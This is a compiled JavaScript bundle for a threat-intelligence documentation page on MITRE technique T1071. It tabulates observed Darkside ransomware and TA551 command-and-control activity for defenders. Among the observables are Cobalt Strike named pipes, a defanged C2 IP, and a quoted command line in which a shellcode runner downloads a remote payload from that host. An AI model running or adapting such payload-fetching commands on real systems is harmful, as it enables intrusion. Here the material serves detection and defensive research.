"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[110],{4137:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return u}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var c=r.createContext({}),m=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=m(e.components);return r.createElement(c.Provider,{value:t},e.children)},s={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),d=m(n),u=a,h=d["".concat(c,".").concat(u)]||d[u]||s[u]||o;return n?r.createElement(h,i(i({ref:t},p),{},{components:n})):r.createElement(h,i({ref:t},p))}));function u(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var m=2;m<o;m++)i[m]=n[m];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},4654:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return c},metadata:function(){return m},toc:function(){return p},default:function(){return d}});var r=n(7462),a=n(3366),o=(n(7294),n(4137)),i=["components"],l={},c=void 0,m={unversionedId:"Techniques/T1071 - Application Layer Protocol",id:"Techniques/T1071 - Application Layer Protocol",isDocsHomePage:!1,title:"T1071 - Application Layer Protocol",description:"Found 4 references across 2 AC3 Threat Sightings. Enjoy!",source:"@site/docs/05-Techniques/T1071 - Application Layer Protocol.md",sourceDirName:"05-Techniques",slug:"/Techniques/T1071 - Application Layer Protocol",permalink:"/ac3-threat-sightings/docs/Techniques/T1071 - Application Layer Protocol",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"T1070.004 - Indicator Removal on Host- File Deletion",permalink:"/ac3-threat-sightings/docs/Techniques/T1070.004 - Indicator Removal on Host- File Deletion"},next:{title:"T1071 - Web Protocols",permalink:"/ac3-threat-sightings/docs/Techniques/T1071 - Web Protocols"}},p=[{value:"From the AC3 Threat Sighting for <em>Darkside Ransomware</em>",id:"from-the-ac3-threat-sighting-for-darkside-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>TA551</em>",id:"from-the-ac3-threat-sighting-for-ta551",children:[]}],s={toc:p};function d(e){var t=e.components,n=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},s,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Found 4 references across 2 AC3 Threat Sightings. Enjoy!"),(0,o.kt)("h2",{id:"from-the-ac3-threat-sighting-for-darkside-ransomware"},"From the AC3 Threat Sighting for ",(0,o.kt)("em",{parentName:"h2"},"Darkside Ransomware")),(0,o.kt)("p",null,"Full details at: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml")),(0,o.kt)("table",null,(0,o.kt)("thead",{parentName:"table"},(0,o.kt)("tr",{parentName:"thead"},(0,o.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,o.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,o.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,o.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,o.kt)("tbody",{parentName:"table"},(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,o.kt)("em",{parentName:"td"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"PE file connected to default Cobalt Strike named pipe (MSSE-*)."),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\MSSE-5861-server"))),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,o.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,o.kt)("em",{parentName:"td"},"BloodHound")," in memory for Discovery."),(0,o.kt)("td",{parentName:"tr",align:null},"DLLHOST connected to default Cobalt Strike named pipe (postex_*)."),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\postex_d0e7"))))),(0,o.kt)("h2",{id:"from-the-ac3-threat-sighting-for-ta551"},"From the AC3 Threat Sighting for ",(0,o.kt)("em",{parentName:"h2"},"TA551")),(0,o.kt)("p",null,"Full details at: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml")),(0,o.kt)("table",null,(0,o.kt)("thead",{parentName:"table"},(0,o.kt)("tr",{parentName:"thead"},(0,o.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,o.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,o.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,o.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,o.kt)("tbody",{parentName:"table"},(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"Shellcode runner connected to public server"),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,o.kt)("inlineCode",{parentName:"td"},"89.163.140[.]101"))),(0,o.kt)("tr",{parentName:"tbody"},(0,o.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,o.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,o.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,o.kt)("td",{parentName:"tr",align:null},"Shellcode runner executed web payload (Cobalt Strike shellcode)"),(0,o.kt)("td",{parentName:"tr",align:null},(0,o.kt)("em",{parentName:"td"},"Process Created"),": ",(0,o.kt)("br",null),"- ",(0,o.kt)("inlineCode",{parentName:"td"},"jyheeckptwa.exe -u http://89[.]163.140.101:8000/download/abc.bin -t 1"))))))}d.isMDXComponent=!0}}]);